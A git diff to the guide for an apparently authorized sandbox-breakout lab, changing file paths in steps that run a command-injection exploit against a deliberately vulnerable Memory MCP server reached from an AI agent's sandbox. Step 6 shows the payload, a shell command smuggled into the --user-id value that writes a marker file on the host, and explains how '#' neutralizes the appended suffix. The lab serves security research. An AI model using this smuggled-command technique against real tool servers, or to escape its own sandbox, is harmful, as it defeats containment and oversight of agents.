@@ -12,7 +12,7 @@ demonstrates, with real terminal output and a file that lands on the host filesy
 achieve arbitrary code execution outside it** — CWE-78 (OS command injection) and CWE-94 (Python
 `eval` code injection), both against a deliberately vulnerable Memory MCP server from
 [`breakout-lab`](https://github.com/Zenodia/standalone_agent_memory)-derived fixtures at
-`/home/ubuntu/breakout-lab`.
+`labs/breakout-lab/` in this repo.
 
 This is authorized security research: a synthetic, CWE-labeled, ground-truth vulnerability lab
 (same format discipline as this repo's other synthetic-vulnerability work), run against
@@ -501,7 +501,7 @@ are up.)
 1. **[Terminal 1] memory-mcp server** (breakout-lab, outside the sandbox) — returns immediately
    (`-d`, detached):
    ```bash
-   cd /home/ubuntu/breakout-lab/openshell
+   cd ~/roundhouse/labs/breakout-lab/openshell
    docker compose --env-file ../.env -f docker-compose.memory-mcp.yml up -d --build
    ```
 2. **[Terminal 2 — dedicated, stays running] Local Dynamo/Qwen worker** (this repo). This command
@@ -550,7 +550,7 @@ are up.)
 6. **[Terminal 1] Install the skill, run the exploit**:
    ```bash
    openshell sandbox upload sandbox-breach-demo \
-     /home/ubuntu/breakout-lab/openshell/skills/memory-recall /sandbox/.claude/skills/memory-recall
+     ~/roundhouse/labs/breakout-lab/openshell/skills/memory-recall /sandbox/.claude/skills/memory-recall
    openshell sandbox exec -n sandbox-breach-demo -- \
      /sandbox/.venv/bin/python3 -m pip install -q fastmcp
    openshell sandbox exec -n sandbox-breach-demo \
@@ -560,12 +560,12 @@ are up.)
        --user-id "ruth; mkdir -p /workspace/openshell/host_breakout_marker && touch /workspace/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_demo #"
    ```
    The `--user-id` is the injection payload. Inside the memory-mcp container `/workspace` maps to
-   `/home/ubuntu/breakout-lab` on the host, so the injected `touch` writes a file the host can
+   `labs/breakout-lab` on the host, so the injected `touch` writes a file the host can
    read. The `#` comments out the `.jsonl` suffix `memory_mcp_server.py` appends to the path.
    Note: `openshell sandbox upload` without a trailing slash on the source nests the directory, so
    `recall.py` lands at `/sandbox/.claude/skills/memory-recall/memory-recall/recall.py` — the
    `--workdir` above accounts for this.
-7. **[Terminal 1] Verify on the host**: `cat /home/ubuntu/breakout-lab/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_*`
+7. **[Terminal 1] Verify on the host**: `cat ~/roundhouse/labs/breakout-lab/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_*`
 8. **[Terminal 1, optional] chain NeMo Relay in front of roundhouse** — this one also returns
    control when the agent's reply is printed, so it's fine to run from Terminal 1:
    ```bash
@@ -591,7 +591,7 @@ See `GAPS.md` for the full table with remedies; in short, as of this run:
 - **`memory_mcp_server.py` LLM** — **fixed** (2026-10-01). Original model
   `nvidia/llama-3.3-nemotron-super-49b-v1.5` was EOL 2026-08-26. Replaced with
   `meta/llama-3.2-11b-vision-instruct` via `integrate.api.nvidia.com` using `NVIDIA_API_KEY`
-  (already in `/home/ubuntu/breakout-lab/.env`, baked into the image at build time). Switched from
+  (already in `labs/breakout-lab/.env`, baked into the image at build time). Switched from
   `ChatNVIDIA` to `ChatOpenAI` (`langchain-openai` now added to `Dockerfile.memory-mcp`).
   A fresh `docker compose --build` picks all of this up automatically — no manual patching needed.
 
